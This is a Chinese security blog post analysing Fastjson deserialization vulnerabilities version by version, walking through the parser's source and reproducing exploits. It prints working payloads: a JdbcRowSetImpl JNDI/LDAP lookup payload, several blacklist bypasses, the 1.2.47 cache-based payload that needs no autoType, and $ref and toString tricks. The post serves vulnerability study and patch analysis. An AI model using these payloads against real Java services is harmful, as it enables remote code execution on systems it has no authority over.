{"blogid": "123734626", "writerAge": "码龄3年", "writerBlogNum": "26", "writerCollect": "35", "writerComment": "2", "writerFan": "30", "writerGrade": "2级", "writerIntegral": "389", "writerName": "长白山攻防实验室", "writerProfileAdress": "writer_image\\profile_123734626.jpg", "writerRankTotal": "70226", "writerRankWeekly": "691026", "writerThumb": "10", "writerVisitNum": "43905", "blog_read_count": "2288", "blog_time": "于 2022-03-25 14:22:55 发布", "blog_title": "Fastjson反序列化漏洞复现分析", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h2><a id=\"0x01__5\"></a><strong>0x01 反序列化过程</strong></h2>\n<p>fastjson将字符串转换为对象的方法主要有parse和parseObject</p>\n<p>其中parseObject也会调用parse来解析json，下面来分析下反序列化过程</p>\n<p>首先写一个测试的javabean</p>\n<pre><code>public class TestBean {\npublic String isMessage;\npublic String message;\npublic int id;\npublic String getMessage() {\nSystem.out.println(\"getMessage called\");\nreturn message;\n}\npublic void setMessage(String message) {\nSystem.out.println(\"setMessage called\");\nthis.message = message;\n}\npublic TestBean() {\n}\npublic TestBean(String message, int id) {\nthis.message = message;\nthis.id = id;\n}\npublic int getId() {\nSystem.out.println(\"getId called\");\nreturn id;\n}\npublic void setId(int id) {\nSystem.out.println(\"setId called\");\nthis.id = id;\n}\n@Override\npublic String toString() {\nreturn \"TestBean{\" +\n\"message='\" + message + '\\'' +\n\", id=\" + id +\n'}';\n}\n}\n</code></pre>\n<p>反序列化测试代码</p>\n<pre><code>import com.alibaba.fastjson.JSON;\npublic class Derjson {\npublic static void main(String[] args) {\nString text = \"{\\\"@type\\\":\\\"TestBean\\\",\\\"message\\\":\\\"hello\\\",\\\"id\\\":888}\";\nObject obj = JSON.parseObject(text);\n  }\n}\n</code></pre>\n<p>下断点调试，首先会进入</p>\n<p>com.alibaba.fastjson.JSON#parseObject(java.lang.String)</p>\n<p>可以看到该方法中调用了parse方法来解析json字符串，跟进该方法</p>\n<p><img alt=\"图片\" src=\"image\\23483e337364409c8ee9d23291edb579.png\"/></p>\n<p>该方法中获取了一个json解析器，一路跟进到</p>\n<pre><code>com.alibaba.fastjson.parser.DefaultJSONParser#DefaultJSONParser(java.lang.Object, com.alibaba.fastjson.parser.JSONLexer, com.alibaba.fastjson.parser.ParserConfig)\n</code></pre>\n<p>会在该方法中盘断json字符串是否以{ 或[开头，然后分配不同的解析流程，以其他字符开头的后面的解析过程中会报错<br/> <img alt=\"图片\" src=\"image\\6cce20822ad211386906926de4d6bb10.png\"/><br/> 然后回到parse来，接着会进行解析json串的流程<br/> <img alt=\"图片\" src=\"image\\5218c01af591f6131588226e7eaa40db.png\"/></p>\n<p>首先是创建一个JSONObject对象，执行</p>\n<p>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)方法</p>\n<p>该方法主要是对json相应的结构进行拆解，获取相应的值，进行对应的处理</p>\n<p>比如在匹配到@type 键值时，会对其对应的值进行类加载操作</p>\n<p><img alt=\"图片\" src=\"image\\dda69c534b18a08884b33c8f505d481e.png\"/><br/> 然后获取对应类的反序列化器<br/> <img alt=\"图片\" src=\"image\\dfcbd8f755afd57a2bf853e692fb7f04.png\"/><br/> 跟进getDeserializer，在识别到类是一个普通的javabean时，会调用</p>\n<p>com.alibaba.fastjson.parser.ParserConfig#createJavaBeanDeserializer</p>\n<p>创建反序列化器，在该方法中又会使用：</p>\n<p>com.alibaba.fastjson.util.JavaBeanInfo#build来绑定对应属性的setter</p>\n<p>getter处理方法，对于setter方法的规定代码如下：</p>\n<p><img alt=\"图片\" src=\"image\\7223943438f16b6a712d47320d0b19fb.png\"/><br/> <img alt=\"图片\" src=\"image\\8ded8387e5159627faec9ff387afef55.png\"/></p>\n<p>要求setter方法长度大于4，不是静态方法，返回类型是void或所在类的类型，参数个数是1，第四个字母需要大写</p>\n<p>然后会把set去掉，第四位字母小写后作为属性值来和bean中的属性列表来对比，当属性成功被匹配到时，将setter方法与该属性绑定</p>\n<p>当没有匹配到时，会将属性名首位大写然后在前面加上is来组成一个新的属性，然后继续将其与bean中的属性列表对比，成功匹配到后将is开头的属性值与setter绑定</p>\n<p><img alt=\"图片\" src=\"image\\b13231651e47c372c626c76c536fa2ff.png\"/><br/> 对于getter方法的规定如下<br/> <img alt=\"图片\" src=\"image\\806866f99b076b3e0a1a5c643ac46fd2.png\"/></p>\n<p>要求getter方法大于4，不能是static方法，方法以get开头且第四位大写，方法不能有参数，返回值继承</p>\n<p>Collection/Map/AtomicBoolean/AtomicInteger/AtomicLong ；</p>\n<p>在绑定完方法后，就开始进行反序列化操作，利用绑定的方法恢复属性的值</p>\n<p>值得注意的是，在反序列化的过程中，fastjson如果对json的字段找不到相应的方法时，会尝试对字段进行处理，反序列化方法</p>\n<pre><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, \njava.lang.reflect.Type, \njava.lang.Object, java.lang.Object, int)\n</code></pre>\n<p><img alt=\"图片\" src=\"image\\894f16af6928161b6a9068c86dde5e45.png\"/><br/> 具体的处理方法：</p>\n<p>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch<br/> <img alt=\"图片\" src=\"image\\e8d814c2f5ca8cc2043f7a17fc4029ea.png\"/></p>\n<p>会尝试去掉字段中的_或-然后再去进行反序列化操作。</p>\n<h2><a id=\"0x02__153\"></a><strong>0x02 漏洞版本分析</strong></h2>\n<p><em><strong>1.2.24</strong></em></p>\n<p>payload如下</p>\n<pre><code>{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8001\", \"autoCommit\":true}\n</code></pre>\n<p>前面已经知道fastjson在解析到@type时会实例化对应的类，然后调用其他键对应的setter方法</p>\n<p>首先会实例化：</p>\n<p>com.sun.rowset.JdbcRowSetImpl类，然后调用其setDataSourceName方法设置DataSourceName<br/> <img alt=\"图片\" src=\"image\\67a6cc4bce9b247d099727f25f2f8eb1.png\"/><br/> 接着会调用setAutoCommit方法，然后调用connect方法<br/> <img alt=\"图片\" src=\"image\\e3c6a75dec00375955d62bec2b9f7b9c.png\"/><br/> 接着获取刚才设置的DataSourceName来发起jndi请求，完成利用<br/> <img alt=\"图片\" src=\"image\\5e5b8f7d9b2a92d1d31b433ea8153f81.png\"/></p>\n<p><strong><em>1.2.25-1.2.41</em></strong></p>\n<p>首先可以看看1.2.5做了哪些改变</p>\n<p>https://github.com/alibaba/fastjson/compare/1.2.24…1.2.25</p>\n<p>在对类进行加载时，添加了一个checkAutoType方法</p>\n<p><img alt=\"图片\" src=\"image\\85c7b02c624a0f047b3636f13d7ba11e.png\"/></p>\n<p>代码如下</p>\n<pre><code>public Class checkAutoType(String typeName, Class expectClass) {\nif (typeName == null) {\nreturn null;\n} else {\nString className = typeName.replace('$', '.');\n//判断是否开启autoTypeSupport\nif (this.autoTypeSupport || expectClass != null) {\nint i;\nString deny;\n//在白名单中寻找目标类，如找到则加载类\nfor(i = 0; i &lt; this.acceptList.length; ++i) {\ndeny = this.acceptList[i];\nif (className.startsWith(deny)) {\nreturn TypeUtils.loadClass(typeName, this.defaultClassLoader);\n}\n}\n//在黑名单中寻找目标类，如找到则报出异常\nfor(i = 0; i &lt; this.denyList.length; ++i) {\ndeny = this.denyList[i];\nif (className.startsWith(deny)) {\nthrow new JSONException(\"autoType is not support. \" + typeName);\n}\n}\n}\nClass clazz = TypeUtils.getClassFromMapping(typeName);\nif (clazz == null) {\nclazz = this.deserializers.findClass(typeName);\n}\nif (clazz != null) {\nif (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) {\nthrow new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName());\n} else {\nreturn clazz;\n}\n} else {\n//当没开启autoTypeSupport时的处理\nif (!this.autoTypeSupport) {\nString accept;\nint i;\n//在黑名单中寻找，匹配到黑名单则抛出异常\nfor(i = 0; i &lt; this.denyList.length; ++i) {\naccept = this.denyList[i];\nif (className.startsWith(accept)) {\nthrow new JSONException(\"autoType is not support. \" + typeName);\n}\n}\n//在白名单中寻找找到后直接加载类\nfor(i = 0; i &lt; this.acceptList.length; ++i) {\naccept = this.acceptList[i];\nif (className.startsWith(accept)) {\nclazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);\nif (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) {\nthrow new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName());\n}\nreturn clazz;\n}\n}\n}\nif (this.autoTypeSupport || expectClass != null) {\nclazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);\n}\nif (clazz != null) {\nif (ClassLoader.class.isAssignableFrom(clazz) || DataSource.class.isAssignableFrom(clazz)) {\nthrow new JSONException(\"autoType is not support. \" + typeName);\n}\nif (expectClass != null) {\nif (expectClass.isAssignableFrom(clazz)) {\nreturn clazz;\n}\nthrow new JSONException(\"type not match. \" + typeName + \" -&gt; \" + expectClass.getName());\n}\n}\nif (!this.autoTypeSupport) {\nthrow new JSONException(\"autoType is not support. \" + typeName);\n} else {\nreturn clazz;\n}\n}\n}\n}\n</code></pre>\n<p>可以看到我们想利用必须要开启autoTypeSupport，然后绕过黑名单的限制，关于黑名单的绕过，可以在</p>\n<p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String,java.lang.ClassLoader)找到答案</p>\n<p><img alt=\"图片\" src=\"image\\1c5817ca7a4a39d2e030a5a73e2e0fbe.png\"/></p>\n<p>在类加载的过程中，会对以[开头，或以L开头并以;结尾的类名进行递归处理，将这些字符串去掉，那我们就可以将本来存在于黑名单的类的类名前面加上L结尾加上;来绕过黑名单的校验</p>\n<p>测试代码</p>\n<pre><code>import com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.ParserConfig;\npublic class Fast1225 {\npublic static void main(String[] args) {\nParserConfig.getGlobalInstance().setAutoTypeSupport(true);\nString text = \"{\\\"@type\\\":\\\"Lcom.sun.rowset.JdbcRowSetImpl;\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:8001\\\",  \\\"autoCommit\\\":true}\";\nObject obj = JSON.parse(text);\n}\n}\n</code></pre>\n<p>在实际测试中发现在类名前面加一个[会出现如下报错</p>\n<p><img alt=\"图片\" src=\"image\\d4010a3417ceb2e0f6551ea24a07eeda.png\"/></p>\n<p>这个问题可以看</p>\n<p>https://xz.aliyun.com/t/7027 的评论</p>\n<p><strong><em>1.2.42</em></strong></p>\n<p>查看版本对比</p>\n<p>https://github.com/alibaba/fastjson/compare/1.2.41…1.2.42</p>\n<p>可以看到将黑名单全换成了hash</p>\n<p><img alt=\"图片\" src=\"image\\732c3d8953676f4c125ee81148e98bd3.png\"/></p>\n<p>同时在校验黑白名单之前，如果类名前面存在L结尾存在; 则会被去除，主要是为了应对1.2.5-1.2.41的情况</p>\n<p><img alt=\"图片\" src=\"image\\06a7658120ae3b041a355ba74b75b748.png\"/></p>\n<p>在这里由于上面分析过</p>\n<p>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String,java.lang.ClassLoader, boolean)</p>\n<p>会将L与；递归删除，所以我们多加两组L与;即可</p>\n<pre><code>import com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.ParserConfig;\npublic class Fast1242 {\npublic static void main(String[] args) {\nParserConfig.getGlobalInstance().setAutoTypeSupport(true);\nString text = \"{\\\"@type\\\":\\\"LLcom.sun.rowset.JdbcRowSetImpl;;\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:8001\\\",  \\\"autoCommit\\\":true}\";\nObject obj = JSON.parse(text);\n}\n}\n</code></pre>\n<p><strong><em>1.2.43</em></strong></p>\n<p>查看对比</p>\n<p>https://github.com/alibaba/fastjson/compare/1.2.42…1.2.43</p>\n<p><img alt=\"图片\" src=\"image\\e2bf5fe05a4326af00d99f306a8660af.png\"/></p>\n<p>主要是修复了多层L;的绕过，这里可以考虑使用[绕过，由于[正常格式json存在报错，payload可以参考</p>\n<p>https://xz.aliyun.com/t/7027</p>\n<pre><code>import com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.ParserConfig;\npublic class Fast1243 {\npublic static void main(String[] args) {\nParserConfig.getGlobalInstance().setAutoTypeSupport(true);\nString text = \"{\\\"@type\\\":\\\"[com.sun.rowset.JdbcRowSetImpl\\\"[{\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:8001\\\",\\\"autoCommit\\\":true}\";\nObject obj = JSON.parse(text);\n}\n}\n</code></pre>\n<p><strong><em>1.2.44</em></strong></p>\n<p>该版本主要对1.2.43的绕过进行了修复，禁止[开头的类名</p>\n<p>https://github.com/alibaba/fastjson/compare/1.2.43…1.2.44</p>\n<p><img alt=\"图片\" src=\"image\\0b3043c34877797ac4361886648dd3d0.png\"/></p>\n<p><strong><em>1.2.45-1.2.46</em></strong></p>\n<p>主要是在修复不断出现的黑名单绕过</p>\n<p>https://github.com/alibaba/fastjson/compare/1.2.44…1.2.46</p>\n<p><img alt=\"图片\" src=\"image\\0853ff39b3baf59bf8b129f83410763f.png\"/></p>\n<p><strong><em>1.2.47</em></strong></p>\n<p>在该版本出现了一个无需开启AutoTypeSupport 的通杀payload</p>\n<pre><code>import com.alibaba.fastjson.JSON;\npublic class Fast1247 {\npublic static void main(String[] args) {\nString text =\"{\\\"a\\\":{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"},\\\"b\\\":{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:8001\\\",\\\"autoCommit\\\":true}}}\";\nObject obj = JSON.parse(text);\n}\n}\n</code></pre>\n<p>分析下payload是如何起到作用的，首先回到checkAutoType方法中来</p>\n<p>不管AutoTypeSupport是否开启(除非类在白名单中会直接return)，都要经过以下代码段</p>\n<p><img alt=\"图片\" src=\"image\\b7e35a7246477e261ad6ae1c4ea3268d.png\"/></p>\n<p>可以看到payload分为两段，第一段想要加载java.lang.Class，首先会尝试从</p>\n<p>com.alibaba.fastjson.util.TypeUtils#mappings 中匹配想要加载的类</p>\n<p>但是没有匹配到，接着会尝试在deserializers中寻找想要加载的类，</p>\n<p>com.alibaba.fastjson.parser.ParserConfig#initDeserializers中初始化</p>\n<p>deserializers的时候，会设置很多个类，其中就包括我们想要的java.lang.Class</p>\n<p><img alt=\"图片\" src=\"image\\cdeeb9e498ca782ad31cb5fadf6b6de8.png\"/></p>\n<p>找到class</p>\n<p>在执行到AutoTypeSupport为false的处理代码之前，就将class return 了出去</p>\n<p>接着就在</p>\n<p>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)方法中反序列化类</p>\n<p>其中反序列化解析器就是初始化deserializers时设置的MiscCodec</p>\n<p><img alt=\"图片\" src=\"image\\ced617b6bc828e2d77339a4948044f47.png\"/></p>\n<p>跟进去到</p>\n<p>com.alibaba.fastjson.serializer.MiscCodec#deserialze方法，当键为val时，</p>\n<p><img alt=\"图片\" src=\"image\\7e7164bc52fcced5483ab3ef0a88df78.png\"/></p>\n<p>会将val的值赋给objval 接着赋值给strval</p>\n<p>接着由于class的值是Class.class，</p>\n<p>会调用TypeUtils.loadClass来加载类</p>\n<p><img alt=\"图片\" src=\"image\\4b7a6edb52f2470bd664b966cb22f8ec.png\"/></p>\n<p>跟进去会发现当cache为true时，会将val对应的值</p>\n<p>com.sun.rowset.JdbcRowSetImpl加入mapping中</p>\n<p><img alt=\"图片\" src=\"image\\62f567be3bc3de2961cce559819f0875.png\"/></p>\n<p>然后就是解析第二段json了，还是回到checkAutoType，还是会经过这段代码</p>\n<p><img alt=\"图片\" src=\"image\\5d6134f823e6654e166bc8d8f736ce8a.png\"/></p>\n<p>此时由于</p>\n<p>com.sun.rowset.JdbcRowSetImpl已经存在于mapping中，很明显可以获取到class,在校验黑名单之前返回类，也就完成了绕过，后面就是正常的触发流程</p>\n<p>在版本1.2.33-1.2.47的时候，无论是否开启AutoTypeSupport，都可以成功利用，但在1.2.25-1.2.32版本中，只有当AutoTypeSupport关闭时才能成功利用</p>\n<p>具体原因主要在开启AutoTypeSupport后的代码处理上存在不同</p>\n<p>https://github.com/alibaba/fastjson/compare/1.2.32…1.2.33</p>\n<p><img alt=\"图片\" src=\"image\\47de79193754d82e8a75256015a17b3f.png\"/></p>\n<p>在1.2.33-1.2.47版本中，只有当类在黑名单且缓存中查询不到时会保持，而之前版本只要在黑名单中就会报错，导致之前版本在AutoTypeSupport开启时不可利用</p>\n<p>总结一下，该payload主要是通过</p>\n<p>fastjson的缓存机制来绕过安全校验，首先将存在于黑名单的恶意类通过</p>\n<p>java.lang.class对应的deserializer的deserialize方法将val对应的值传入loadclass然后将其加入mapping缓存中，接着在加载恶意类的时候会直接从缓存中获取，将安全校验绕过</p>\n<p>在1.2.48中，直接将缓存开关默认关闭，阻止用户将类加入缓存中</p>\n<p><strong><em>1.2.68</em></strong></p>\n<p>在该版本中，主要的利用思路是checkAutoType</p>\n<p>方法中传入的expectClass参数</p>\n<p>主要代码如下：</p>\n<p><img alt=\"图片\" src=\"image\\240092c84b8a1ba92dc4c4b90e34ed0b.png\"/></p>\n<p><img alt=\"图片\" src=\"image\\3f0b48c7c7bace750da5ca808de8ccbe.png\"/></p>\n<p>当传入的expectClass不在限制的黑名单中，传入的类名不在黑名单中，传入的类与expectClass是继承关系，则可以不使checkAutoType抛出异常正常执行代码</p>\n<p>经搜索只有JavaBeanDeserializer</p>\n<p>ThrowableDeserializer的deserialze方法以及JavaBeanDeserializer的</p>\n<p>deserialzeArrayMapping</p>\n<p>方法会在调用checkAutoType时传入不为null的expectClass</p>\n<p>其中java.lang.AutoCloseable也可以通过校验，因为它在缓存中而且输入输出流的类都实现于java.lang.AutoCloseable</p>\n<p>那么链子的寻找就变成了寻找不在黑名单中且实现了这几个可用接口的类，查找类中的getter,setter 或 构造方法中是否存在可利用的操作</p>\n<p>具体链条的构造可以参考</p>\n<p>https://b1ue.cn/archives/364.html</p>\n<h2><a id=\"0x03_payload_535\"></a><strong>0x03 一些有意思的payload</strong></h2>\n<p><strong><em>$ref构造</em></strong></p>\n<p>我们知道当使用parse方法来解析json时，是不会触发getter方法的，在1.2.36版本以后，可以利用$ref来构造特殊的payload,使其能调用getter方法</p>\n<p>测试payload如下：</p>\n<pre><code>import com.alibaba.fastjson.parser.ParserConfig;\npublic class Derjson {\npublic static void main(String[] args) {\nParserConfig.getGlobalInstance().setAutoTypeSupport(true);\nString text = \"[{\\\"@type\\\":\\\"TestBean\\\",\\\"message\\\":\\\"xxx\\\"},{\\\"$ref\\\":\\\"$[0].id\\\"}]\";\nObject obj = JSON.parse(text);\n}\n}\n</code></pre>\n<p><img alt=\"图片\" src=\"image\\8911ed441f458cdce3982b8d391f39a8.png\"/></p>\n<p>可以成功的触发getId方法，下面简要分析下fastjson是怎么处理的先看到</p>\n<p>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)方法</p>\n<p><img alt=\"图片\" src=\"image\\256dbe8899f28404261632c7d97c570a.png\"/></p>\n<p>当匹配到key为$ref 且value不为@，… , $时，会将value暂存起来，并添加一个ResolveTask，将当前value保存，然后等parse执行完后，会检查ResolveTask</p>\n<p><img alt=\"图片\" src=\"image\\733777b4db911329472a4092391bc3c4.png\"/></p>\n<p>com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask</p>\n<p><img alt=\"图片\" src=\"image\\ae3e037f7bd79c8761223db700ecd9d5.png\"/></p>\n<p>由于前面新添加了一个ResolveTask，这里不会return出去，将会进入JSONPath.eval，然后一路</p>\n<p>com.alibaba.fastjson.JSONPath#getPropertyValue</p>\n<p><img alt=\"图片\" src=\"image\\7452b6b27108dfb4526649ab922d0406.png\"/></p>\n<p>在该方法中会先获取JavaBeanSerializer然后调用</p>\n<p>getFieldValue获取指定属性的值，取值就会用调用到我们想调用的getter方法</p>\n<p><strong><em>触发toString</em></strong></p>\n<p>以下payload可以触发目标类的toString方法</p>\n<pre><code>import com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.parser.ParserConfig;\npublic class Derjson {\npublic static void main(String[] args) {\nParserConfig.getGlobalInstance().setAutoTypeSupport(true);\nString text = \"{<!-- -->{\\\"@type\\\":\\\"TestBean\\\",\\\"message\\\":\\\"xxx\\\"}:\\\"xyz\\\"}\";\nObject obj = JSON.parse(text);\n}\n}\n</code></pre>\n<p><img alt=\"图片\" src=\"image\\968d8c0687daa33383757ea3ea226f5b.png\"/></p>\n<p>主要原因是在</p>\n<p>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)方法中</p>\n<p><img alt=\"图片\" src=\"image\\2dd0d1245a877f4ad6e3ef6f0753016f.png\"/></p>\n<p>由于xyz对应的key值是一个JSONObject对象，这时会调用其key的toString方法，也就是触发了TestBean的toString方法</p>\n<h2><a id=\"0x04__614\"></a><strong>0x04 参考链接</strong></h2>\n<ol><li> <p>https://xz.aliyun.com/t/7027</p> </li><li> <p>https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</p> </li><li> <p>https://github.com/safe6Sec/Fastjson</p> </li><li> <p>https://su18.org/post/fastjson/</p> </li><li> <p>https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.Java%E5%AE%89%E5%85%A8/2.%E5%90%84%E7%A7%8D%E5%88%86%E6%9E%90/06.Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html#fastjson%E9%BB%91%E5%90%8D%E5%8D%95</p> </li><li> <p><a href=\"https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&amp;mid=2247484403&amp;idx=1&amp;sn=84c4e8b31c9c91264c061eadd7ff01d0&amp;scene=21#wechat_redirect\">https://mp.weixin.qq.com/s/GvR7ZXBtqDUUb3jXYYUexg</a></p> </li><li> <p>https://b1ue.cn/archives/348.html</p> </li><li> <p>https://blog.0kami.cn/2020/04/13/java/talk-about-fastjson-deserialization/</p> </li></ol>\n<h2><a id=\"_649\"></a><strong>声明</strong></h2>\n<p>以上内容，均为文章作者原创，由于传播，利用此文所提供的信息而造成的任何直接或间接的后果和损失，均由使用者本人负责，长白山攻防实验室以及文章作者不承担任何责任。</p>\n<p>长白山攻防实验室拥有该文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的副本，包括版权声明等全部内容。声明长白山攻防实验室允许，不得任意修改或增减此文章内容，不得以任何方式将其用于商业目的。</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}